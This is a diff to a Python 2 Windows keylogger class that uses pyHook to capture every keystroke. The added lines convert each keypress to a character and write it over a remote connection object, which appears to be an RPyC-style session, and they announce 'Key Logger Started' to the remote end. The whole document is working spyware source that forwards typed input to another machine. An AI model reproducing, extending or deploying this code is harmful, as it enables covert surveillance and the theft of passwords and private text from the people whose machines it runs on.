@@ -1,3 +1,6 @@
+import ctypes
+import time
+
 class Keylog():
   def OnKeyboardEvent(self,event):
     print 'MessageName:',event.MessageName
@@ -14,18 +17,36 @@ class Keylog():
     print 'Transition', event.Transition
     print '---'
     
+    #import pdb; pdb.set_trace()
+    message = chr(event.Ascii).__str__()
+
+    self.output(message)
+
+    #ctypes.windll.user32.PostQuitMessage(0)
+    
     if int(event.Ascii) == 3:
       print 'Time to quit this bitch'
-      import ctypes
       ctypes.windll.user32.PostQuitMessage(0)
       return False
       
     return True
     
-  def __init__(self):
+  def output(self,message):
+
+    self.conn.modules.sys.stdout.write(message)
+    
+
+    
+  def __init__(self,conn):
+    
     import pythoncom, pyHook
+    self.conn = conn
     hm = pyHook.HookManager()
     hm.KeyDown = self.OnKeyboardEvent
     hm.HookKeyboard()
-    # wait forever
-    return pythoncom.PumpMessages()
+    conn.modules.sys.stdout.write("Key Logger Started\n")
+    
+
+    #pythoncom.PumpMessages()
+    
+    return 
